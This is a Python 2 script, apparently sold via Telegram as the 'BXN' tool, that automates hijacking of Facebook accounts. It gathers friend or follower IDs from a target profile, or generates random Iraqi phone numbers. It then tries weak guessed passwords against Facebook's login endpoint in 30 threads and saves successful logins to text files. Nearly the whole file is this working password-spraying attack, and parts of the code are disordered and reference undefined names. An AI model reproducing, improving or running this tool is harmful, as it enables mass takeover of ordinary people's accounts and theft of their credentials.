try:
    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pip2 install requests")
os.system("clear")
from requests.exceptions import ConnectionError
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf-8")
c = "\033[1;32m"
c2 = "\033[0;97m"
c3 = "\033[1;31m"
os.system('clear')
logo5 = """

      

888888b.  Y88b   d88P 888b    888 
888  "88b  Y88b d88P  8888b   888 
888  .88P   Y88o88P   88888b  888 
8888888K.    Y888P    888Y88b 888 
888  "Y88b   d888b    888 Y88b888 
888    888  d88888b   888  Y88888 
888   d88P d88P Y88b  888   Y8888 
8888888P" d88P   Y88b 888    Y888 
                                  
                                  
                                  



--------------------------------------------------
  \033[1;97m Author   : TLYAK
  Note : 10$
  Telegram : lililliilliil
--------------------------------------------------
                """
def dark():
    os.system("clear")
    print logo5
    print("Welcome to new xbn tool")
    time.sleep(0)
    os.system("clear")
    print logo5
    print("1= Crack Facbook Login Token ")
    print("2= Crack Facbook No Login Crack Number")
    print("-----------------------------------------------")
    dark__select()
def dark__select():
    zed = raw_input("\n==BXN ")
    if zed =="1":
        b_menu()
    elif zed =="2":
        dark_pro()
    else:
        os.system('"\t    \033[1;31mSelect a valid option "')
        dark__select()
def login():
    os.system("clear")
    print logo5
    print('"[1]Token daxlba   "')
    print('"-----------------------------------------------"')
    login_select()
def login_select():
    hedi = raw_input("\n=BXN ") 
    if hedi =="1":
        os.system("clear")
        print logo5
        print('" \t    \033[1;32mlogin with token\033[0;97m "')
	print('"-----------------------------------------------"')
        token = raw_input(" Token : ")
	os.system('"-----------------------------------------------"')
        token_s = open(".fb_token.txt","w")
        token_s.write(token)
        token_s.close()
        try:
            r = requests.get("https://graph.facebook.com/me?access_token="+token)
            q = json.loads(r.text)
            name = q["name"]
            nm = name.rsplit(" ")[0]
            print("\t\033[1;97mToken logged in as : "+nm+"\033[0;97m")
            time.sleep(3)
            dark()
        except (KeyError , IOError):
            os.system('" \t    \033[1;31mToken not valid\033[0;97m "')
            raw_input(" Press enter to try again ")
            login()
    elif abm =="18283":
        login_fb()
    else:
        print("\t    "+c+"Select valid method"+c2)
        login_select()
def login_fb():
	os.system("clear")
	print logo5
	os.system('" \t    \033[1;32mlogin with password\033[0;97m "')
	os.system('" \t    \033[1;32muse any proxy to login\033[0;97m "')
	os.system('"-----------------------------------------------"')
	id = raw_input(" ID/Mail/Num : ")
	id1=id.replace(' ','')
	id2=id1.replace('(','')
	uid=id2.replace(')','')
	pwd = raw_input(" Password   : ")
	os.system('"-----------------------------------------------"')
	logging()
	data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
        q = json.loads(data)
        if "access_token" in q:
            succ = open(".login.txt","w")
            succ.write(q["access_token"])
            succ.close()
            os.system('" \n\033[1;92m Login Successfull\033[0;97m "')
            time.sleep(1)
            menu()
        else:
            if "www.facebook.com" in q["error_msg"]:
                os.system('" \n\033[1;31m[!] Login Failed . Account Has a Checkpoint\033[0;97m "')
                time.sleep(1)
                login_fb()
            else:
                os.system('"\n\033[1;31m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m  "')
                time.sleep(1)
                login_fb()
def b_menu():
    global token
    os.system("clear")
    print logo5
    try:
        token = open(".fb_token.txt","r").read()
    except (KeyError , IOError):
        login()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        nm = q["name"]
        nmf = nm.rsplit(" ")[0]
        ok = nmf
    except (KeyError , IOError):
        print("\t    "+c+"checkpoint"+c2)
        os.system("rm -rf .fb_token.txt")
        time.sleep(1)
        login()
    except requests.exceptions.ConnectionError:
        print logo5
        os.system('" \t    \033[1;31mTurn on mobile data OR wifi \033[0;97m "')
        time.sleep(1)
        raw_input(" Press enter to try again \033[0;97m")
        b_menu()
    os.system("clear")
    print logo5
    print("\t  "+c+"User ID"+ok+c2)
    print('"-----------------------------------------------"')
    print('"[1]Clone From Public ID "')
    print('"[2]Clone From Followers "')
    print('"[0]Logout "')
    print('"-----------------------------------------------"')
    b_menu_select()
def b_menu_select():
	abm = raw_input("\n =BXN")
	id=[]
	oks=[]
	cps=[]
	if abm =="1":
		os.system("clear")
		print logo5
		print('"\t    Public ID Menu " ')
		print('"-----------------------------------------------"')
		idt = raw_input(" Enter ID/Username :  ")
		os.system('"-----------------------------------------------"')
		time.sleep(2)
		os.system("clear")
		print logo5
		time.sleep(2)
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system("clear")
			print logo5
			print('"\t    Public ID Menu " ')
			print('"-----------------------------------------------"')
			print(" User ID : "+q["name"])
		except (KeyError , IOError):
		    os.system('" \n\t    \033[1;31m Logged in id has been checkpoint\033[0;97m "')
		    raw_input("\nPress enter to back ")
		    b_menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif abm =="2":
		os.system("clear")
		print logo5
		print('"\t    Followers ID Menu " ')
		print('"-----------------------------------------------"')
		idt = raw_input(" Enter ID/Username : ")
		time.sleep(2)
		os.system("clear")
		print logo5
		print("")
		print("")
		print("")
		print('"\t    Please Wait " ')
		print("")
		print("")
		print("")
		time.sleep(5)
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
			q = json.loads(r.text)
			os.system("clear")
			print logo5
			print('"\t    Followers ID Menu" ')
			print(" User ID : "+q["name"])
			print('"-----------------------------------------------"')
		except (KeyError , IOError):
		    os.system('" \t    \033[1;31m Logged in id has been checkpoint\033[0;97m"')
		    raw_input("\nPress enter to back ")
		    b_menu()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
		z = json.loads(r.text)
		for i in z["data"]:
			uid=i['id']
			na=i['name']
			nm=na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
			
	print(" ALL ID   : "+str(len(id)))
	time.sleep(2)
	os.system("clear")
	print logo5
	print('"Please wait clone account will be appear here "')
	print('"TOOL =BXN="')
	print("Wait_10min_30min......................")
	print('"-----------------------------------------------"')
	
	
	def main(arg):
		user=arg
		uid,name=user.split("|")
		try:
		    pass1=name+"123"
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		    d=json.loads(q)
		    if 'www.facebook.com' in d['error_msg']:
		        print '\n\x1b[1;36;40m\xe2\x95\x94[CHECKPOINT] \x1b[1;97m \n\xe2\x95\x91ID: ' +uid+ '\n\xe2\x95\x91PASS: ' + pass1 + '\n\xe2\x95\x9aNAW: ' +name
		        cp=open("cp.txt","a")
		        cp.write(uid+" | "+pass1+"\n")
		        cp.close()
		        cps.append(uid)
		    else:
		    	if "access_token" in d:
		            print '\n\x1b[1;92m\xe2\x95\x94[GOOD] \x1b[1;92m\n\xe2\x95\x91ID: ' +uid+ ' \n\xe2\x95\x91PASS:  ' + pass1 + '\n\xe2\x95\x9aNAW: ' +name
		            ok=open("ok.txt","a")
		            ok.write(uid+" | "+pass1+"\n")
		            ok.close()
		            oks.append(uid)
		        else:
		            pass2=name+"1234"
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print '\n\x1b[1;36;40m\xe2\x95\x94[CHECKPOINT] \x1b[1;97m \n\xe2\x95\x91ID: ' +uid+ '\n\xe2\x95\x91PASS: ' + pass2 + '\n\xe2\x95\x9aNAW: ' +name
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		            else:
		                if 'access_token' in d:
		                    print '\n\x1b[1;92m\xe2\x95\x94[GOOD] \x1b[1;92m\n\xe2\x95\x91ID: ' +uid+ ' \n\xe2\x95\x91PASS:  ' + pass2 + '\n\xe2\x95\x9aNAW: ' +name
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                else:
		                    pass3=name+"12345"
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                    d=json.loads(q)
		                    if 'www.facebook.com' in d['error_msg']:
		                        print '\n\x1b[1;36;40m\xe2\x95\x94[CHECKPOINT] \x1b[1;97m \n\xe2\x95\x91ID: ' +uid+ '\n\xe2\x95\x91PASS: ' + pass3 + '\n\xe2\x95\x9aNAW: ' +name
		                        cp=open("cp.txt","a")
		                        cp.write(uid+" | "+pass3+"\n")
		                        cp.close()
		                        cps.append(uid)
		                    else:
		                        if 'access_token' in d:
		                            print '\n\x1b[1;92m\xe2\x95\x94[GOOD] \x1b[1;92m\n\xe2\x95\x91ID: ' +uid+ ' \n\xe2\x95\x91PASS:  ' + pass3 + '\n\xe2\x95\x9aNAW: ' +name
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                        else:
		                            pass4=name+"1122334455"
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                            d=json.loads(q)
		                            if 'www.facebook.com' in d['error_msg']:
		                                print '\n\x1b[1;36;40m\xe2\x95\x94[CHECKPOINT] \x1b[1;97m \n\xe2\x95\x91ID: ' +uid+ '\n\xe2\x95\x91PASS: ' + pass4 + '\n\xe2\x95\x9aNAW: ' +name
		                                cp=open("cp.txt","a")
		                                cp.write(uid+" | "+pass4+"\n")
		                                cp.close()
		                                cps.append(uid)
		                            else:
		                                if 'access_token' in d:
		                                    print '\n\x1b[1;92m\xe2\x95\x94[GOOD] \x1b[1;92m\n\xe2\x95\x91ID: ' +uid+ ' \n\xe2\x95\x91PASS:  ' + pass4 + '\n\xe2\x95\x9aNAW: ' +name
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                else:
		                                    pass5="112233445566"
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                    d=json.loads(q)
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        print '\n\x1b[1;36;40m\xe2\x95\x94[CHECKPOINT] \x1b[1;97m \n\xe2\x95\x91ID: ' +uid+ '\n\xe2\x95\x91PASS: ' + pass5 + '\n\xe2\x95\x9aNAW: ' +name
		                                        cp=open("cp.txt","a")
		                                        cp.write(uid+" | "+pass5+"\n")
		                                        cp.close()
		                                        cps.append(uid)
		                                    else:
		                                        if 'access_token' in d:
		                                            print '\n\x1b[1;92m\xe2\x95\x94[GOOD] \x1b[1;92m\n\xe2\x95\x91ID: ' +uid+ ' \n\xe2\x95\x91PASS:  ' + pass5 + '\n\xe2\x95\x9aNAW: ' +name 
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                        else:
		                                            pass6="1122334455"
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
		                                            d=json.loads(q)
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                print '\n\x1b[1;36;40m\xe2\x95\x94[CHECKPOINT] \x1b[1;97m \n\xe2\x95\x91ID: ' +uid+ '\n\xe2\x95\x91PASS: ' + pass6 + '\n\xe2\x95\x9aNAW: ' +name 
		                                                cp=open("cp.txt","a")
		                                                cp.write(uid+" | "+pass6+"\n")
		                                                cp.close()
		                                                cps.append(uid)
		                                            else:
		                                                if 'access_token' in d:
		                                                    print '\n\x1b[1;92m\xe2\x95\x94[GOOD] \x1b[1;92m\n\xe2\x95\x91ID: ' +uid+ ' \n\xe2\x95\x91PASS:  ' + pass6 + '\n\xe2\x95\x9aNAW: ' +name
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		
		                                                            
		
		                                               
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print('"-----------------------------------------------"')
	print('" Process has completed "')
	print (" Total CP/OK : "+str(len(cps)) + "/"+str(len(oks)))
        os.system('"-----------------------------------------------"')
	raw_input(" Press enter to main menu back ")
	b_menu()
	
	
def dark_pro():
    import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, time
os.system('rm -rf .txt')
for n in range(4999):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    os.system('pkg install figlet -y')
    time.sleep(1)

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')
#####LOGO####
logo = """

888888b.  Y88b   d88P 888b    888 
888  "88b  Y88b d88P  8888b   888 
888  .88P   Y88o88P   88888b  888 
8888888K.    Y888P    888Y88b 888 
888  "Y88b   d888b    888 Y88b888 
888    888  d88888b   888  Y88888 
888   d88P d88P Y88b  888   Y8888 
8888888P" d88P   Y88b 888    Y888 

--------------------------------------------------
  \033[1;97m Author   : TLYAK
  Note  : 10$
  Telegram : lililliilliil
--------------------------------------------------
                """ 
back = 0
successful = []
cpb = []
oks = []
id = []
os.system("clear")
def dark_pro():
    os.system('clear')
    print logo
    print '=============='
    print 'IRAQ'
    print '=============='
    print '1- Start'
    print '0- Exit        '
    print '=============='
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n|==>>>>  ')
    if bch == '':
        print ' Fill in correctly'
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print '751, 770, 750, 771, 752, 772'
        try:
            c = raw_input('Choose The Code  : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print 'File Not Found'
            raw_input('\n[ Back ]')
            menu()


    elif bch == '13':
        login()
    elif bch == '0':
        exb()
    else:
        print 'Fill in correctly'
        action()
    xxx = str(len(id))
    psb('Total Numbers: ' + xxx)
    time.sleep(0.5)
    psb('Please wait, Chaware ba...')
    time.sleep(0.5)
    psb('Bo Ragrtni Hack CTRL lagal Press z')
    time.sleep(0.5)
    print ' ------------------------------------------------------- '

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\n\x1b[1;92m\xe2\x95\x94[GOOD]\x1b[1;92m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass1 + '\n\xe2\x95\x9a '
                okb = open('save/cloned.txt', 'a')
                okb.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;36;40m\xe2\x95\x94[CHECKPOINT] \x1b[1;97m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass1 + '\n\xe2\x95\x9a '
                cps = open('save/cloned.txt', 'a')
                cps.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '1234512345'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m\xe2\x95\x94[GOOD] \x1b[1;92m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass2 + '\n\xe2\x95\x9a '
                    okb = open('save/cloned.txt', 'a')
                    okb.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;36;40m\xe2\x95\x94[CHECKPOINT]\x1b[1;97m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass2 + '\n\xe2\x95\x9a '
                    cps = open('save/cloned.txt', 'a')
                    cps.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '1122334455'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m\xe2\x95\x94[GOOD] \x1b[1;92m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass3 + '\n\xe2\x95\x9a'
                        okb = open('save/cloned.txt', 'a')
                        okb.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;36;40m\xe2\x95\x94[CHECKPOINT] \x1b[1;97m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass3 + '\n\xe2\x95\x9a '
                        cps = open('save/cloned.txt', 'a')
                        cps.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = '123456123456'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m\xe2\x95\x94[GOOD] \x1b[1;92m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass4 + '\n\xe2\x95\x9a'
                            okb = open('save/cloned.txt', 'a')
                            okb.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;36;40m\xe2\x95\x94[CHECKPOINT] \x1b[1;97m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass4 + '\n\xe2\x95\x9a'
                            cps = open('save/cloned.txt', 'a')
                            cps.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 = '112233445566'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m\xe2\x95\x94[GOOD] \x1b[1;92m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass5 + '\n\xe2\x95\x9a '
                                okb = open('save/cloned.txt', 'a')
                                okb.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;36;40m\xe2\x95\x94[CHECKPOINT] \x1b[1;97m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass5 + '\n\xe2\x95\x9a'
                                cps = open('save/cloned.txt', 'a')
                                cps.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '         '
    print 'Process Has Been Completed ....'
    print 'Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
    print 'CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')





dark()
